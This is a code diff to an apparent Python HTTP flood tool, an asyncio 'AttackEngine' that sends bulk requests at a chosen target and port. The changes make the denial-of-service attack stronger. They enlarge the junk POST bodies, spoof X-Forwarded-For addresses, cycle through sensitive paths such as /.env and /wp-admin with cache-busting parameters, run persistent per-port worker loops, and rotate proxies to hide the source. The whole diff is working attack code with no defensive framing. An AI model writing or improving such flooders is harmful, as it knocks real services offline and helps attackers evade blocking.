@@ -2,7 +2,7 @@ import asyncio
 import random
 import string
 import time
-from typing import List, Optional
+from typing import Optional
 from urllib.parse import urlparse
 
 import aiohttp
@@ -25,9 +25,14 @@ UA = [
 ]
 REF = ["https://google.com/search?q=", "https://bing.com/search?q=", "https://duckduckgo.com/?q=",
        "https://yandex.ru/search/?text=", "https://reddit.com/", "https://github.com/"]
+PATHS = ["/", "/index.html", "/login", "/api/", "/admin", "/wp-admin", "/search?q=",
+         "/api/v1/users", "/graphql", "/xmlrpc.php", "/.env", "/config.json",
+         "/api/status", "/health", "/dashboard", "/register"]
 _c = string.ascii_letters + string.digits
 
-_JUNK = ["".join(random.choices(_c, k=10000)) for _ in range(20)]
+_JUNK = ["".join(random.choices(_c, k=50000)) for _ in range(10)]
+
+WORKERS_PER_PORT = 200
 
 
 def _j(lo=3, hi=12):
@@ -36,11 +41,12 @@ def _j(lo=3, hi=12):
 def _h():
     return {"User-Agent": random.choice(UA), "Accept": "text/html,*/*;q=0.8",
             "Accept-Encoding": "gzip, deflate, br", "Referer": random.choice(REF) + _j(5, 15),
-            "Cache-Control": "no-cache", "Connection": "keep-alive"}
+            "Cache-Control": "no-cache", "Connection": "keep-alive",
+            "X-Forwarded-For": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"}
 
 def _p():
-    return {_j(5, 10): random.choice(_JUNK)[:random.randint(5000, 10000)]
-            for _ in range(random.randint(2, 5))}
+    return {_j(5, 10): random.choice(_JUNK)[:random.randint(20000, 50000)]
+            for _ in range(random.randint(3, 8))}
 
 def _m(m):
     return random.choice(["GET", "POST", "HEAD"]) if m == AttackMethod.MIX else m.value
@@ -48,13 +54,14 @@ def _m(m):
 def _url(target, port):
     parsed = urlparse(target)
     host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
-    path = parsed.path or "/"
-    if port == 443: return f"https://{host}{path}"
-    elif port == 80: return f"http://{host}{path}"
-    return f"https://{host}:{port}{path}"
+    if port == 443: return f"https://{host}"
+    elif port == 80: return f"http://{host}"
+    return f"https://{host}:{port}"
 
 def _bust(base):
-    return f"{base}{'&' if '?' in base else '?'}{_j(3,6)}={_j(8,16)}"
+    path = random.choice(PATHS)
+    sep = "&" if "?" in path else "?"
+    return f"{base}{path}{sep}{_j(3,6)}={_j(8,16)}"
 
 
 class AttackEngine:
@@ -99,10 +106,13 @@ class AttackEngine:
 
     async def _run(self, target, ports, method, threads, duration, use_proxies):
         deadline = time.time() + duration if duration > 0 else 0
-        alive_ports = [p for p in ports if self.stats.ports[p].status == PortStatus.ALIVE]
-        tpp = max(threads // max(len(alive_ports), 1), 100)
+        workers_pp = min(WORKERS_PER_PORT, threads // max(len(ports), 1))
+        workers_pp = max(workers_pp, 50)
 
-        tasks = [asyncio.create_task(self._port_flood(target, p, method, tpp, deadline, use_proxies)) for p in ports]
+        tasks = []
+        for p in ports:
+            tasks.append(asyncio.create_task(
+                self._port_flood(target, p, method, workers_pp, deadline, use_proxies)))
         tasks.append(asyncio.create_task(self._health_loop(target)))
 
         await asyncio.gather(*tasks, return_exceptions=True)
@@ -114,9 +124,8 @@ class AttackEngine:
                 self.stats.status = AttackStatus.FINISHED
         self.stats = self.stats.snapshot()
 
-    async def _port_flood(self, target, port, method, threads, deadline, use_proxies):
+    async def _port_flood(self, target, port, method, num_workers, deadline, use_proxies):
         base = _url(target, port)
-        sem = asyncio.Semaphore(threads)
         d_timeout = aiohttp.ClientTimeout(total=settings.request_timeout, connect=3)
         p_timeout = aiohttp.ClientTimeout(total=settings.proxy_timeout, connect=2)
 
@@ -124,22 +133,14 @@ class AttackEngine:
         d_session = aiohttp.ClientSession(connector=d_conn, timeout=d_timeout)
 
         try:
-            while not self._stop.is_set():
-                if deadline and time.time() >= deadline:
-                    break
-                ps = self.stats.ports.get(port)
-                if not ps or ps.status != PortStatus.ALIVE:
-                    await asyncio.sleep(0.5)
-                    continue
-
-                use_px = use_proxies and proxy_pool.alive_count > 100
-                batch = []
-                for _ in range(threads):
-                    if use_px and random.random() > 0.3:
-                        batch.append(self._px_req(base, port, method, sem, p_timeout))
-                    else:
-                        batch.append(self._direct_req(d_session, base, port, method, sem))
-                await asyncio.gather(*batch, return_exceptions=True)
+            workers = []
+            for i in range(num_workers):
+                use_px = use_proxies and (i % 5 >= 2)
+                workers.append(asyncio.create_task(
+                    self._worker(d_session, base, port, method, deadline, use_px, p_timeout, i)))
+                if i % 50 == 49:
+                    await asyncio.sleep(0)
+            await asyncio.gather(*workers, return_exceptions=True)
         except asyncio.CancelledError:
             pass
         except Exception as e:
@@ -147,46 +148,61 @@ class AttackEngine:
         finally:
             await d_session.close()
 
-    async def _direct_req(self, session, base, port, method, sem):
-        async with sem:
-            if self._stop.is_set():
-                return
+    async def _worker(self, d_session, base, port, method, deadline, use_px, p_timeout, wid):
+        await asyncio.sleep(wid * 0.01)
+        while not self._stop.is_set():
+            if deadline and time.time() >= deadline:
+                break
             ps = self.stats.ports.get(port)
             if not ps or ps.status != PortStatus.ALIVE:
-                return
-            m = _m(method)
-            kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
-            if m == "POST":
-                kw["json"] = _p()
+                await asyncio.sleep(0.5)
+                continue
+            if use_px and proxy_pool.alive_count < 50:
+                use_px = False
             try:
-                async with session.request(**kw) as resp:
-                    self._hit(ps, resp.status, resp.headers, True)
-            except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
-                self._miss(ps, True)
-
-    async def _px_req(self, base, port, method, sem, timeout):
-        async with sem:
-            if self._stop.is_set():
-                return
-            ps = self.stats.ports.get(port)
-            if not ps or ps.status != PortStatus.ALIVE:
-                return
-            px = proxy_pool.random()
-            if not px:
-                return
-            m = _m(method)
-            kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
-            if m == "POST":
-                kw["json"] = _p()
-            try:
-                conn = ProxyConnector.from_url(px, ssl=False)
-                async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
-                    async with s.request(**kw) as resp:
-                        self._hit(ps, resp.status, resp.headers, False)
-                        proxy_pool.mark_alive(px)
+                if use_px:
+                    await self._fire_proxy(base, port, method, p_timeout)
+                else:
+                    await self._fire_direct(d_session, base, port, method)
             except Exception:
-                self._miss(ps, False)
-                proxy_pool.mark_dead(px)
+                pass
+
+    async def _fire_direct(self, session, base, port, method):
+        ps = self.stats.ports.get(port)
+        if not ps:
+            return
+        m = _m(method)
+        kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
+        if m == "POST":
+            kw["json"] = _p()
+        try:
+            async with session.request(**kw) as resp:
+                await resp.read()
+                self._hit(ps, resp.status, resp.headers, True)
+        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
+            self._miss(ps, True)
+
+    async def _fire_proxy(self, base, port, method, timeout):
+        ps = self.stats.ports.get(port)
+        if not ps:
+            return
+        px = proxy_pool.random()
+        if not px:
+            return
+        m = _m(method)
+        kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
+        if m == "POST":
+            kw["json"] = _p()
+        try:
+            conn = ProxyConnector.from_url(px, ssl=False)
+            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
+                async with s.request(**kw) as resp:
+                    await resp.read()
+                    self._hit(ps, resp.status, resp.headers, False)
+                    proxy_pool.mark_alive(px)
+        except Exception:
+            self._miss(ps, False)
+            proxy_pool.mark_dead(px)
 
     def _hit(self, ps, status, headers, is_direct):
         ps.total_requests += 1
@@ -225,7 +241,7 @@ class AttackEngine:
                             alive = True
                 except Exception:
                     pass
-                if not alive and ps.consecutive_fails >= 30:
+                if not alive and ps.consecutive_fails >= 50:
                     ps.status = PortStatus.DOWN
             if all(ps.status != PortStatus.ALIVE for ps in self.stats.ports.values()):
                 self._stop.set()
